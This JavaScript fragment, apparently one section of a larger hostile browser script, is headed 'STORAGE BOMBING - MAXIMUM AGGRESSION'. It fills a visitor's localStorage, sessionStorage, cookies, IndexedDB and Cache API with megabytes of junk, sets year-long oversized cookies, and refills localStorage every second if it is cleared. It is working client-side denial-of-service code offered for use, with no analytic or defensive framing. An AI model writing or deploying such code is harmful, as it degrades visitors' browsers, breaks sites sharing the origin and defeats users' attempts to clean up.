/**
 * 15. STORAGE BOMBING - MAXIMUM AGGRESSION
 * Fills localStorage, sessionStorage, cookies, IndexedDB, Cache API
 */
const StorageBombing = {
    init: function() {
        this.bombLocalStorage();
        this.bombSessionStorage();
        this.bombCookies();
        this.bombIndexedDB();
        this.bombCacheAPI();
    },
    bombLocalStorage: function() {
        try {
            const data = 'X'.repeat(1024 * 1024); // 1MB chunks
            for (let i = 0; i < 10; i++) {
                localStorage.setItem('bomb_' + i, data);
            }
        } catch(e) {
            // Fill with smaller chunks
            try {
                const small = 'X'.repeat(1024 * 100);
                for (let i = 0; i < 100; i++) {
                    localStorage.setItem('bomb_' + i, small);
                }
            } catch(e2) {}
        }
        // Keep refilling if cleared
        setInterval(() => {
            try {
                if (!localStorage.getItem('bomb_0')) {
                    const data = 'X'.repeat(1024 * 100);
                    for (let i = 0; i < 50; i++) {
                        localStorage.setItem('bomb_' + i, data);
                    }
                }
            } catch(e) {}
        }, 1000);
    },
    bombSessionStorage: function() {
        try {
            const data = 'X'.repeat(1024 * 100);
            for (let i = 0; i < 50; i++) {
                sessionStorage.setItem('bomb_' + i, data);
            }
        } catch(e) {}
    },
    bombCookies: function() {
        try {
            const cookieData = 'X'.repeat(4000);
            for (let i = 0; i < 50; i++) {
                document.cookie = 'bomb_' + i + '=' + cookieData + ';path=/;max-age=31536000';
            }
        } catch(e) {}
    },
    bombIndexedDB: function() {
        try {
            const request = indexedDB.open('BombDB', 1);
            request.onupgradeneeded = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains('bombs')) {
                    db.createObjectStore('bombs');
                }
            };
            request.onsuccess = (e) => {
                const db = e.target.result;
                const tx = db.transaction('bombs', 'readwrite');
                const store = tx.objectStore('bombs');
                const data = new Blob(['X'.repeat(1024 * 1024)]);
                for (let i = 0; i < 20; i++) {
                    store.put(data, 'bomb_' + i);
                }
            };
        } catch(e) {}
    },
    bombCacheAPI: function() {
        try {
            caches.open('bomb-cache').then((cache) => {
                for (let i = 0; i < 10; i++) {
                    const blob = new Blob(['X'.repeat(1024 * 1024)], { type: 'text/plain' });
                    const url = URL.createObjectURL(blob);
                    cache.put('/bomb_' + i, new Response(blob));
                }
            });
        } catch(e) {}
    }
};